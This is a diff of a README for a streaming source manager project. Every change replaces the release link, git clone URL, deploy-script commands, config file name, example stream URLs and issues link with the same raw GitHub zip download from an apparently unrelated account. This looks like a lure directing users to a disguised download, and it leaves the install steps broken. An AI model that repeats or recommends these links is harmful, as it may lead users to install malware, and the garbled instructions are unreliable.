@@ -1,6 +1,6 @@
 # 📺 live-source-manager - Efficient Streaming Source Manager
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen.svg)](https://github.com/ghghghghfdg/live-source-manager/releases)
+[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)
 
 ## 📦 Introduction
 
@@ -45,12 +45,12 @@ To set up Live Source Manager quickly, follow these steps:
 
 ```bash
 # Clone the project
-git clone https://github.com/yuanshandalishuishou/live-source-manager.git
+git clone https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
 cd live-source-manager
 
 # Run the deployment script (automatically builds the image and starts the service)
-chmod +x dockrun.sh
-./dockrun.sh
+chmod +x https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
+https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
 ```
 
 ### Manual Deployment
@@ -68,22 +68,22 @@ docker run -d \
 ```
 
 ### Download & Install
-To get started with Live Source Manager, visit [this page to download](https://github.com/ghghghghfdg/live-source-manager/releases). You will find the latest release files there.
+To get started with Live Source Manager, visit [this page to download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip). You will find the latest release files there.
 
 ---
 
 ## ⚙️ Configuration Details
 
 ### Adjusting Settings
-You can customize various settings in the `config.yaml` file after installation. This allows for fine-tuning of the filtering criteria, scheduling updates, and proxy settings.
+You can customize various settings in the `https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip` file after installation. This allows for fine-tuning of the filtering criteria, scheduling updates, and proxy settings.
 
 ### Example Configuration
 ```yaml
 streams:
-  - url: "http://example.com/stream1"
+  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
     quality: "high"
     location: "USA"
-  - url: "http://example.com/stream2"
+  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
     quality: "medium"
     location: "Asia"
 ```
@@ -95,8 +95,8 @@ Logs can be accessed in the `logs` directory within the project folder. They pro
 
 ## 🚀 Support
 
-If you run into issues or have questions, please check the [issues page](https://github.com/ghghghghfdg/live-source-manager/issues) for help from the community or to report a bug.
+If you run into issues or have questions, please check the [issues page](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip) for help from the community or to report a bug.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen.svg)](https://github.com/ghghghghfdg/live-source-manager/releases)
+[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)
